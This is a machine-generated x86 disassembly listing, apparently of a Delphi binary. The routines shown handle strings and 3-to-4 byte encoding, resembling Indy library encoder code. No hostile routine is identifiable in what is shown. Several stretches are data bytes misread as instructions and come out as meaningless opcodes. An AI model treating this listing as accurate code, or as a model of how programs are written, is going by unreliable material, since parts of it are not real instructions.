pop [ fs : 0x0 ]
add esp 0xc
sub_46cbdc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_404500
xor eax eax
push ebp
push sub_46cc36
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
xor edx edx
mov eax edi
call sub_46cb14
lea eax [ edi + 0x78 ]
mov edx [ ebp + 0x8 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc3d
lea eax [ ebp + 0x8 ]
call sub_404050
retn
add esp 0xfffffff0
call sub_4035a0
sub_46cc5c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46cec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ esi ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41582c
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
call sub_4040e8
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407ddc
test al al
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c1d4
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407ddc
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ sub_46c2cc ]
call sub_41a944
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_46ce98
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0x78 ]
call sub_4040e8
lea eax [ ebx + 0x78 ]
call sub_404050
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_46b65c
jmp r-xdata
mov ecx [ ebx + 0x80 ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_40435c
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_407ddc
test al al
je r-xdata
mov [ esi ] 0x1
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
push r-xdata
push [ ebx + 0x80 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4043d0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_407ddc
test al al
je r-xdata
mov ecx [ ebx + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cb14
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ce9f
lea eax [ ebp - 0x10 ]
call sub_40d19c
retn
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ rw-data ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ sub_46c2cc ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_404310
test eax eax
jle r-xdata
mov eax [ esi + 0x70 ]
call sub_46f1d8
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40435c
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404318
mov eax [ ebp - 0x14 ]
call sub_404310
push eax
lea eax [ ebp - 0x14 ]
call j_sub_40451c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_416890
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x2e
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0x30 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov ecx 0x1
mov edx 0x1
call sub_4045b0
sub_46cf48
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
mov eax [ ebp - 0x8 ]
call sub_404500
xor eax eax
push ebp
push sub_46d136
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4040e8
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_407ddc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x2
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_407bf8
mov edx [ ebp - 0x18 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
mov ebx eax
test ebx ebx
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x14 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
call sub_404050
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0xc ]
call sub_404310
mov ecx eax
lea edx [ ebx + 0x9 ]
mov eax [ ebp - 0xc ]
call sub_404570
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0xc ]
call sub_404310
test eax eax
jle r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4040e8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_407bf8
mov edx [ ebp - 0x1c ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
add eax 0x5
push eax
mov eax [ ebp - 0xc ]
call sub_404310
mov ecx eax
mov eax [ ebp - 0xc ]
pop edx
call sub_404570
mov eax [ ebp - 0xc ]
call sub_404310
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d13d
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_404074
retn
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x22
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
mov edx [ ebp - 0xc ]
call sub_4040a4
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_4040a4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_46a9bc
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x68
call sub_4040a4
jmp r-xdata
sub_46d18b
inc [ ecx ]
add [ eax ] al
add [ edx ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d3b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46b65c
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ eax + 0x40 ]
call sub_46cf48
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d3bc
lea eax [ ebp - 0x30 ]
mov edx 0xb
call sub_404074
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41582c
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_46f0dc
mov eax [ ebp - 0x8 ]
call sub_404310
test eax eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x9
je r-xdata
push ebp
lea ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41582c
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx r-xdata
call sub_41582c
mov eax [ ebp - 0x30 ]
pop edx
call sub_46cf48
pop ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov eax ebx
mov edx [ rw-data ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
sub al 0x17
jne r-xdata
mov eax [ ebx + 0x70 ]
mov edx [ ebp - 0x8 ]
call sub_46f1e4
mov eax [ ebp - 0x4 ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_4040a4
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404570
mov eax [ ebp - 0x24 ]
mov ecx r-xdata
mov edx r-xdata
call sub_40c9c4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x6c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
lea ecx [ ebp - 0x18 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x7fffffff
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_404570
push [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4043d0
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
dec edx
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_40c9c4
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
sub_46d42c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b674
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46d46c
push ebx
mov ebx edx
mov eax [ ebx + 0x6c ]
cmp [ eax + 0x28 ] 0x0
jle r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_4040a4
pop ebx
retn
cmp [ eax + 0x2c ] 0x0
jle r-xdata
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_4040a4
jmp r-xdata
pop ebx
retn
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_4040a4
sub_46d5b5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_46d6b6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax ebx
call sub_41664c
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
xor ecx ecx
mov dl 0x1
mov eax [ sub_46c010 ]
call sub_46c228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d691
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp - 0x18 ]
jb r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x39
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_40435c
add [ ebp - 0x10 ] 0x39
adc [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov edx eax
mov eax esi
pop ecx
call sub_416890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d698
jmp r-xdata
sub_46d6c7
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_46d6f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d6fc
retn
sub_46d700
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b5bc
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_46b588
mov dl 0x1
mov eax [ r-xdata ]
call sub_46d42c
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_46b734
sub_46d78c
fcom st7
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 8 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 8 ] cl
inc esi
add [ eax - 0x5c000000 ] dh
mov edx 0xb0b40046
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ eax ] dl
fadd [ esi ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add al dl
fadd [ esi ]
mov al 0x0
add [ eax ] al
mov edi ss
inc esi
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ eax ] al
add [ eax - 0x4bffb947 ] cl
mov al 0x41
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
push ebp
inc ebp
mov eax eax
in al 0xd8
inc esi
add [ edi ] al
or eax 0x44644954
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] cl
stosb [ edi ]
mov eax eax
and al 0xd8
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax - 0x26 ] dl
inc esi
add [ eax ] bh
add [ eax ] al
add [ ecx + ebx * 8 ] cl
inc esi
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
push ebp
inc ebp
inc edx
popad
jae r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
inc eax
push ebp
inc ebp
pushfd
fadd [ esi ]
and al bl
inc esi
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
push ebp
inc ebp
inc edx
popad
jae r-xdata
cmp eax 0x41403f3e
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push ebp
inc ebp
mov eax eax
fiadd [ fs : esi ]
pop es
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] cl
stosb [ edi ]
mov eax eax
movsb [ edi ] [ esi ]
fld [ esi ]
pop es
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ eax - 0x23 ] dl
inc esi
add [ ecx ] dl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
push ebp
inc ebp
add [ eax ] al
mov eax eax
pop eax
fld [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
fld [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx ds
inc esi
add [ eax ] bh
dec eax
inc ecx
push eax
fcom st7
inc esi
add [ ebx + edi * 4 ] dh
inc esi
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_4040a4
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
push ebp
inc ebp
sbb al 0xda
inc esi
add [ eax + 0x40046d9 ] ah
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ebx + ebx * 8 ] ah
inc esi
add [ eax - 0x25 ] bh
inc esi
add [ 0x44644954 ] cl
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
push ebp
inc ebp
add [ eax ] al
mov eax eax
pushfd
fadd [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xd8
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
shl [ eax + ecx - 0x7d ] cl
push ebp
inc ebp
add [ eax ] al
mov eax eax
dec eax
inc ecx
push eax
pop eax
fld [ esi ]
sub al 0xba
inc esi
add [ eax + eax ] al
or cl [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add al bl
fiadd [ esi ]
push eax
fld [ esi ]
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
push ebp
inc ebp
add [ eax ] al
mov eax eax
sbb al 0xda
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 8 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_46da8f
inc [ eax ]
add [ eax ] al
pushad
and [ edx ] esp
and esp [ 0x29282726 ]
sub ch [ ebx ]
sub al 0x2d
das
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
cmp bh [ ebx ]
cmp al 0x3d
aas
inc eax
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_4040a4
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46db24
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46db78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46dbe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40c9c4
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_46dc10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dbec
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_46dc10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push j_sub_4039d0#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dd49
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx esi [ ebx + eax + 0x2f ]
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4045b0
mov eax esi
mov ecx 0x3
cdq
idiv ecx
sub edx 0x1
jb r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
lea eax [ ebp - 0x4 ]
call sub_40469c
jmp r-xdata
je r-xdata
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46bbc4
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_40469c
mov eax [ ebp - 0x4 ]
call sub_404310
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x2 ] dl
mov eax [ ebp - 0x4 ]
call sub_404310
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
dec edx
je r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_40469c
mov eax [ ebp - 0x4 ]
call sub_404310
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
sub_46dd50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46ddda
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41662c
mov [ ebp - 0x8 ] eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46bdb4
mov eax esi
call sub_41662c
push edx
push eax
mov eax [ ebp - 0x8 ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
add eax 0x1
adc edx 0x0
mov edx [ ebx + 0x30 ]
mov dl [ edx + eax - 0x1 ]
lea eax [ ebp - 0xc ]
call sub_404238
mov edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax edi
call sub_40435c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dde1
lea eax [ ebp - 0xc ]
call sub_404050
retn
sub_46ddec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46de1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de24
retn
mov eax rw-data
call sub_404050
sub_46e058
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e0ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e0dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0e4
retn
mov eax rw-data
call sub_404050
sub_46e108
push esp
loope r-xdata
mov dh 0x46
add [ eax + 0x48 ] dl
inc ecx
